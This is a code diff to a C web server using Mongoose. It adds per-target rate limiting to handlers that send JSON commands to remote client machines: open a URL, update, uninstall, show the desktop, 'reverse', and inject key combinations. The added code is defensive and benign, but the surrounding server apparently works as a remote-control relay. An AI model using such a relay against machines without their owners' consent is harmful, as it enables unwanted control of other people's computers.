@@ -62,6 +62,43 @@ static int is_rate_limited(unsigned long ip) {
     return 0;
 }
 
+// Target Rate limiting
+#define TARGET_RL_COOLDOWN_SEC 2.0
+#define MAX_TARGET_RL_CLIENTS 100
+
+struct target_rl_entry {
+    char id[32];
+    double last_time;
+};
+
+static struct target_rl_entry s_target_rl_entries[MAX_TARGET_RL_CLIENTS];
+
+static int is_target_rate_limited(const char *id) {
+    double now = (double)mg_millis() / 1000.0;
+    for (int i = 0; i < MAX_TARGET_RL_CLIENTS; i++) {
+        if (strcmp(s_target_rl_entries[i].id, id) == 0) {
+            if (now - s_target_rl_entries[i].last_time < TARGET_RL_COOLDOWN_SEC) {
+                return 1; // Limited
+            }
+            s_target_rl_entries[i].last_time = now;
+            return 0; // Allowed
+        }
+    }
+    // Find empty slot
+    for (int i = 0; i < MAX_TARGET_RL_CLIENTS; i++) {
+        if (s_target_rl_entries[i].id[0] == '\0') {
+            strncpy(s_target_rl_entries[i].id, id, sizeof(s_target_rl_entries[i].id) - 1);
+            s_target_rl_entries[i].last_time = now;
+            return 0;
+        }
+    }
+    // Overwrite random (using time as random-ish index)
+    int idx = (int)(now * 1000) % MAX_TARGET_RL_CLIENTS;
+    strncpy(s_target_rl_entries[idx].id, id, sizeof(s_target_rl_entries[idx].id) - 1);
+    s_target_rl_entries[idx].last_time = now;
+    return 0;
+}
+
 // Fonction utilitaire pour récupérer un paramètre de la query string
 // Mongoose a mg_http_get_var mais on va le faire simplement
 void get_qs_var(const struct mg_str *query, const char *name, char *dst, size_t dst_len) {
@@ -98,6 +135,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
             get_qs_var(&hm->query, "url", url, sizeof(url));
             
             if (strlen(target_id) > 0 && strlen(url) > 0) {
+                if (is_target_rate_limited(target_id)) {
+                    mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                    return;
+                }
+
                 // Création du JSON
                 cJSON *json = cJSON_CreateObject();
                 cJSON_AddStringToObject(json, "url", url);
@@ -126,6 +168,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
             get_qs_var(&hm->query, "id", target_id, sizeof(target_id));
 
             if (strlen(target_id) > 0) {
+                if (is_target_rate_limited(target_id)) {
+                    mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                    return;
+                }
+
                 // Création du JSON
                 cJSON *json = cJSON_CreateObject();
                 cJSON_AddStringToObject(json, "command", "update");
@@ -179,6 +226,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
             get_qs_var(&hm->query, "from", from_user, sizeof(from_user));
 
             if (strlen(target_id) > 0 && strlen(from_user) > 0) {
+                if (is_target_rate_limited(target_id)) {
+                    mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                    return;
+                }
+
                 cJSON *json = cJSON_CreateObject();
                 cJSON_AddStringToObject(json, "command", "uninstall");
                 cJSON_AddStringToObject(json, "from", from_user);
@@ -209,6 +261,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
             get_qs_var(&hm->query, "id", target_id, sizeof(target_id));
 
             if (strlen(target_id) > 0) {
+                if (is_target_rate_limited(target_id)) {
+                    mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                    return;
+                }
+
                 cJSON *json = cJSON_CreateObject();
                 cJSON_AddStringToObject(json, "command", "showdesktop");
                 char *json_str = cJSON_PrintUnformatted(json);
@@ -234,6 +291,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
             get_qs_var(&hm->query, "id", target_id, sizeof(target_id));
 
             if (strlen(target_id) > 0) {
+                if (is_target_rate_limited(target_id)) {
+                    mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                    return;
+                }
+
                 cJSON *json = cJSON_CreateObject();
                 cJSON_AddStringToObject(json, "command", "reverse");
                 char *json_str = cJSON_PrintUnformatted(json);
@@ -261,6 +323,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
             get_qs_var(&hm->query, "combo", combo, sizeof(combo));
 
             if (strlen(target_id) > 0 && strlen(combo) > 0) {
+                if (is_target_rate_limited(target_id)) {
+                    mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                    return;
+                }
+
                 cJSON *json = cJSON_CreateObject();
                 cJSON_AddStringToObject(json, "command", "key");
                 cJSON_AddStringToObject(json, "combo", combo);
@@ -317,6 +384,11 @@ static void fn(struct mg_connection *c, int ev, void *ev_data) {
                 get_qs_var(&hm->query, "id", target_id, sizeof(target_id));
                 
                 if (strlen(target_id) > 0) {
+                    if (is_target_rate_limited(target_id)) {
+                        mg_http_reply(c, 429, s_cors_headers, "Too Many Requests for this target\n");
+                        return;
+                    }
+
                     // Construction de l'URL
                     char host[128];
                     struct mg_str *h = mg_http_get_header(hm, "Host");
